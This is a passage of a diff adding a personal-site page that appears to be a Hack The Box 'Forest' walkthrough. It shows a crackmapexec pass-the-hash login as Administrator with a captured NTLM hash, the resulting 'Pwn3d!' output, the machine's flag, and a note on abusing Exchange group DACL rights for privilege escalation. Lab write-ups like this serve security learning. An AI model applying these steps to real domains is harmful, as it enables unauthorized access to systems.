+</li><li>Check with crackmapexec</li></ol>
+
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)</code></pre>
+
+<p>Flag: <span style="border-bottom:0.05em solid"><strong>379cc202b4f4bc06e629b11195c16620</strong></span></p>
+
+
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="f518910e-8016-425d-bf31-85d0a095c454" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%"><p>The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL</p><p>With write access to the target object's DACL, you can grant yourself any privilege you want on the object.</p></div></aside>
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
